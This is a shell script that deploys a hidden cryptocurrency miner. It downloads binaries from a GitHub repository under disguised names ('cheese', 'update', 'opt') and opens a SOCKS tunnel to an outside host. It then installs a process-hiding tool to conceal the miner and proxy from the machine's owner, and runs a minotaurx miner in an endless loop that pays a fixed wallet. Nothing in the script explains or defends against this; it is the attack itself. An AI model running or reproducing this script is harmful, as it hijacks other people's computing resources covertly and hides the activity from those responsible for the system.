#!/bin/sh
cd
ls -la

apt update >/dev/null;apt -y install automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget >/dev/null

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date

sleep 2

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/cheese.tar.gz > /dev/null

sleep 2

tar -xf cheese.tar.gz

sleep 2

./cheese client -v cpusocks$(shuf -i 7-12 -n 1).wot.mrface.com:80 7777:socks &

sleep 2

curl -x socks5h://127.0.0.1:7777 ifconfig.me
echo ""
echo ""
netstat -ntlp
echo ""
echo ""

sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Fish_')
ipaddress=$(curl -s ifconfig.me)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 1`
echo ""
echo "You will be using : $used_num_of_cores cores"
echo ""

sleep 2

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/update.tar.gz > /dev/null

tar -xf update.tar.gz > /dev/null

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:7777
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

echo " "
echo " "

echo "******************************************************************"

./update/update curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "


sleep 2

wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash

sleep 2

source ~/.bashrc

sleep 2

nvm install 21.6.1

sleep 2

npm

sleep 2

npm install -g npm@10.4.0

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add update-local 1>/dev/null 2>&1

sleep 2

ph add opt 1>/dev/null 2>&1

sleep 2

netstat -ntlp

sleep 2

./update/update wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/opt.tar.gz > /dev/null

sleep 2

tar -xf opt.tar.gz

sleep 2

netstat -ntlp

sleep 2

echo " "
echo " "

sleep 2

echo "Your worker name will be : $currentdate"

echo ""
echo ""

sleep 2

ls

echo ""
echo ""

sleep 2

while true
do
./opt -a minotaurx -o stratum+tcp://usa.latinminers.com:9451 -u MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate -p c=MAZA,m=solo -t $used_num_of_cores --proxy=socks5://127.0.0.1:7777
sleep 10
done
